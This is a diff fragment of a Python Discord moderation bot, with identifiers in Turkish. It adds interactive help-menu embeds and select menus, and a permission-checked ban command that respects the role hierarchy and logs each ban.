+        embed.add_field(name="Hizli Baslangic", value="`.profil`\n`.ticketpanel`\n`.levelkur`\n`.gifcevap`\n`.jailkur`", inline=False)
+        return embed
+
+    def kategori_embed(kategori: str):
+        kayitlar = komutlar.get(kategori, [])
+        embed = temel_embed(kategori, "Bu kategorideki tum komutlar asagida listeleniyor.")
+        for i, parca in enumerate(_yardim_parcalari(_yardim_komut_metni(kayitlar))[:6]):
+            embed.add_field(name=f"Liste {i + 1}", value=parca, inline=False)
+        return embed
+
+    def sistem_embed(sistem: str):
+        adlar = sistem_haritasi.get(sistem, set())
+        kayitlar = []
+        for liste in komutlar.values():
+            kayitlar.extend([kayit for kayit in liste if kayit["ad"] in adlar])
+        kayitlar.sort(key=lambda x: x["gosterim"])
+        embed = temel_embed(f"{sistem} Sistemi", f"{sistem} ile ilgili tum komutlar burada.")
+        for i, parca in enumerate(_yardim_parcalari(_yardim_komut_metni(kayitlar))[:6]):
+            embed.add_field(name=f"Liste {i + 1}", value=parca, inline=False)
+        return embed
+
+    class KategoriSec(discord.ui.Select):
+        def __init__(self):
+            secenekler = [discord.SelectOption(label=kategori, value=kategori, description=f"{len(kayitlar)} komut") for kategori, kayitlar in komutlar.items() if kayitlar]
+            super().__init__(placeholder="Kategoriler", min_values=1, max_values=1, options=secenekler)
+
+        async def callback(self, interaction: discord.Interaction):
+            if not _komut_sahibi_degisebilir_mi(interaction, sahibi_id):
+                await interaction.response.send_message("Bu menuyu sadece komutu yazan kisi kullanabilir.", ephemeral=True)
+                return
+            await interaction.response.edit_message(embed=kategori_embed(self.values[0]), view=view)
+
+    class SistemSec(discord.ui.Select):
+        def __init__(self):
+            secenekler = [discord.SelectOption(label=sistem, value=sistem, description="Sistem komutlarini gosterir") for sistem in sistem_haritasi]
+            super().__init__(placeholder="Sistemler", min_values=1, max_values=1, options=secenekler)
+
+        async def callback(self, interaction: discord.Interaction):
+            if not _komut_sahibi_degisebilir_mi(interaction, sahibi_id):
+                await interaction.response.send_message("Bu menuyu sadece komutu yazan kisi kullanabilir.", ephemeral=True)
+                return
+            await interaction.response.edit_message(embed=sistem_embed(self.values[0]), view=view)
+
+    class MenuSec(discord.ui.Select):
+        def __init__(self):
+            secenekler = [
+                discord.SelectOption(label="Ana Menu", value="ana", description="Ozet ekrana don"),
+                discord.SelectOption(label="Tum Komutlar", value="tum", description="Tum aktif komutlari tek listede goster"),
+            ]
+            super().__init__(placeholder="Yardim Menusu", min_values=1, max_values=1, options=secenekler)
+
+        async def callback(self, interaction: discord.Interaction):
+            if not _komut_sahibi_degisebilir_mi(interaction, sahibi_id):
+                await interaction.response.send_message("Bu menuyu sadece komutu yazan kisi kullanabilir.", ephemeral=True)
+                return
+            if self.values[0] == "ana":
+                await interaction.response.edit_message(embed=ana_embed(), view=view)
+                return
+            tum = []
+            for kategori in ["Ayarlar", "Moderasyon", "Roller", "Sistemler", "Kullanici", "Eglence", "Slash", "Diger"]:
+                tum.extend(komutlar.get(kategori, []))
+            tum.sort(key=lambda x: x["gosterim"])
+            embed = temel_embed("Tum Komutlar", "Koddaki tum aktif komutlar burada listeleniyor.")
+            for i, parca in enumerate(_yardim_parcalari(_yardim_komut_metni(tum), limit=850)[:8]):
+                embed.add_field(name=f"Liste {i + 1}", value=parca, inline=False)
+            await interaction.response.edit_message(embed=embed, view=view)
+
+    class HelpView(discord.ui.View):
+        def __init__(self):
+            super().__init__(timeout=None)
+            self.add_item(KategoriSec())
+            self.add_item(SistemSec())
+            self.add_item(MenuSec())
+
+        async def interaction_check(self, interaction: discord.Interaction) -> bool:
+            if not _komut_sahibi_degisebilir_mi(interaction, sahibi_id):
+                await interaction.response.send_message("Bu menuyu sadece komutu yazan kisi kullanabilir.", ephemeral=True)
+                return False
+            return True
+
+        @discord.ui.button(label="Ana Menu", style=discord.ButtonStyle.secondary, row=3)
+        async def ana(self, interaction: discord.Interaction, button: discord.ui.Button):
+            await interaction.response.edit_message(embed=ana_embed(), view=self)
+
+    view = HelpView()
+    await ctx.send(embed=ana_embed(), view=view)
+
+
+@bot.command(name="ban", aliases=["blupbum"])
+@commands.has_permissions(ban_members=True)
+async def ban_final(ctx, hedef: str = None, *, sebep: str = "Sebep belirtilmedi"):
+    if hedef is None and ctx.message.reference and ctx.message.reference.message_id:
+        try:
+            referans = await ctx.channel.fetch_message(ctx.message.reference.message_id)
+            if referans:
+                hedef = str(referans.author.id)
+        except Exception:
+            hedef = None
+
+    if hedef is None:
+        await ctx.send(embed=kullanim_embedi("`.ban @uye [sebep]`, `.ban <id> [sebep]` veya bir mesaja yanit verip `.ban [sebep]`"))
+        return
+
+    hedef_id = None
+    hedef_uye = None
+    if ctx.message.mentions:
+        hedef_uye = ctx.message.mentions[0]
+        hedef_id = hedef_uye.id
+    elif str(hedef).isdigit():
+        hedef_id = int(str(hedef))
+        hedef_uye = ctx.guild.get_member(hedef_id)
+    else:
+        hedef_uye = discord.utils.find(lambda m: str(m) == hedef or m.name == hedef, ctx.guild.members)
+        hedef_id = hedef_uye.id if hedef_uye else None
+
+    if hedef_id is None:
+        await ctx.send(embed=hata_embedi("Gecersiz Hedef", "Banlanacak kullaniciyi mention, isim veya ID ile belirtmelisin."))
+        return
+    if hedef_id == ctx.author.id:
+        await ctx.send(embed=hata_embedi("Islem Engellendi", "Kendini banlayamazsin."))
+        return
+    if hedef_uye is not None:
+        if hedef_uye.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
+            await ctx.send(embed=hata_embedi("Yetki Yetersiz", "Bu uyeyi banlayacak yetkin yok."))
+            return
+        if hedef_uye.top_role >= ctx.guild.me.top_role:
+            await ctx.send(embed=hata_embedi("Bot Yetkisi Yetersiz", "Bot bu uyeyi rol hiyerarsisi nedeniyle banlayamiyor."))
+            return
+
+    try:
+        await ctx.guild.ban(discord.Object(id=hedef_id), reason=f"{ctx.author} tarafindan: {sebep}")
+    except discord.Forbidden:
+        await ctx.send(embed=hata_embedi("Ban Basarisiz", "Botun ban yetkisi veya rol hiyerarsisi yetersiz."))
+        return
+    except discord.HTTPException as e:
+        await ctx.send(embed=hata_embedi("Ban Basarisiz", f"Discord ban istegini reddetti: {e}"))
+        return
+
+    hedef_yazi = hedef_uye.mention if hedef_uye else f"`{hedef_id}`"
+    embed = mod_embed("🔨 Uye Banlandi", RENKLER["ban"], **{
+        "👤 Hedef": hedef_yazi,
+        "📝 Sebep": sebep,
+        "🛡️ Yetkili": ctx.author.mention
+    })
+    await ctx.send(embed=embed)
+    await log_gonder(ctx.guild, "ban_log", embed)
 
 app = Flask(__name__)
 
